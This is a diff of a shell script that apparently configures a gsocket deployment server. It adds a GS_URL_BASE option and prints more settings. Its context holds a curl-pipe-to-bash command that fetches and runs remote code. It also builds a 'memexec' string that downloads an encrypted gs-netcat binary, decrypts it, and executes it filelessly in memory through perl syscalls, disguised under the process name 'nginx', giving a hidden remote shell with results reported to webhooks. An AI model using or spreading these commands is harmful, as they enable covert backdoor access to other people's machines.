@@ -16,6 +16,7 @@
 #   export GS_HOST=
 #   export GS_BEACON=10
 #   export GS_NAME=foo
+#   export GS_URL_BASE=
 #   bash -c "$(curl -fsSL https://gsocket.io/deploy/ys)"
 # ---or---
 #   LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/deploy/ys)"
@@ -218,19 +219,22 @@ sed "s|^URL_BASE=.*|URL_BASE=\"${URL_BASE}\"|" -i "${DATA_DIR_BRANCH}/${DEPLOY_S
 sed "s|^IS_DEPLOY_SERVER=.*|IS_DEPLOY_SERVER=1|" -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
 sed "s|^gs_deploy_webhook=.*|gs_deploy_webhook='${URL_BASE}/results.php?s=\${GS_SECRET}'|" -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
 sed 's|^GS_WEBHOOK_404_OK=.*|GS_WEBHOOK_404_OK=1|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
-[ -n "$GS_HOST" ] &&  sed 's|^DS_GS_HOST=.*|DS_GS_HOST='"'$GS_HOST'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
-[ -n "$GS_PORT" ] &&  sed 's|^DS_GS_PORT=.*|DS_GS_PORT='"'$GS_PORT'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
+[ -n "$GS_HOST" ]   &&  sed 's|^DS_GS_HOST=.*|DS_GS_HOST='"'$GS_HOST'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
+[ -n "$GS_PORT" ]   &&  sed 's|^DS_GS_PORT=.*|DS_GS_PORT='"'$GS_PORT'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
 [ -n "$GS_BEACON" ] &&  sed 's|^DS_GS_BEACON=.*|DS_GS_BEACON='"'$GS_BEACON'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
-[ -n "$GS_NAME" ] &&  sed 's|^DS_GS_NAME=.*|DS_GS_NAME='"'$GS_NAME'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
-[ -n "$GS_BIN" ] &&  sed 's|^DS_GS_BIN=.*|DS_GS_BIN='"'$GS_BIN'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
+[ -n "$GS_NAME" ]   &&  sed 's|^DS_GS_NAME=.*|DS_GS_NAME='"'$GS_NAME'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
+[ -n "$GS_BIN" ]    &&  sed 's|^DS_GS_BIN=.*|DS_GS_BIN='"'$GS_BIN'"'|' -i "${DATA_DIR_BRANCH}/${DEPLOY_SH_NAME}"
 
 # memexec string:
 MEMCMD="X=\"\$(head -c64</dev/urandom|base64|tr -dc [:alnum:]|head -c22)\" && curl -SskfL \"${URL_BASE:-https://BAD}${URL_BRANCH}/bin/gs-netcat_mini-linux-\$(uname -m).enc?s=\$X\"|openssl enc -d -aes-256-cbc -pbkdf2 -k ${ENCPASS}|GS_NOFFPID=1 GS_ARGS=\"-ilD -s\${X}\"${GS_BEACON:+ GS_BEACON=$GS_BEACON}${GS_HOST:+ GS_HOST=$GS_HOST}${GS_PORT:+ GS_PORT=$GS_PORT} perl '"'-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}'"${GS_NAME:-nginx}"',@ARGV'"'"
 MEMCMD64="$(gzip<<<"${MEMCMD}" | base64 -w0)"
 
 echo -e "${CDG}SUCCESS${CN}"
-[ -n "$GS_HOST" ] && echo -e   "--> ${CDG}GS_HOST='$GS_HOST'${CN}"
-[ -n "$GS_PORT" ] && echo -e   "--> ${CDG}GS_PORT='$GS_PORT'${CN}"
+[ -n "$GS_HOST" ]   && echo -e   "--> ${CDG}GS_HOST='$GS_HOST'${CN}"
+[ -n "$GS_PORT" ]   && echo -e   "--> ${CDG}GS_PORT='$GS_PORT'${CN}"
+[ -n "$GS_BEACON" ] && echo -e   "--> ${CDG}GS_BEACON='$GS_BEACON'${CN}"
+[ -n "$GS_NAME" ]   && echo -e   "--> ${CDG}GS_NAME='$GS_NAME'${CN}"
+[ -n "$GS_BIN" ]    && echo -e   "--> ${CDG}GS_BIN='$GS_BIN'${CN}"
 echo -e "${CDY}To log via Telegram, Discord or webhook.site please edit
 ${CW}$(realpath "$(pwd)/${DATA_DIR_BRANCH}/y")${CDY} and set${CN}
 1. ${CDC}GS_TG_TOKEN=${CN}, ${CDC}GS_TG_CHATID=${CN} OR ${CDC}GS_DISCORD_KEY=${CN} OR ${CDC}GS_WEBHOOK_KEY=${CN}
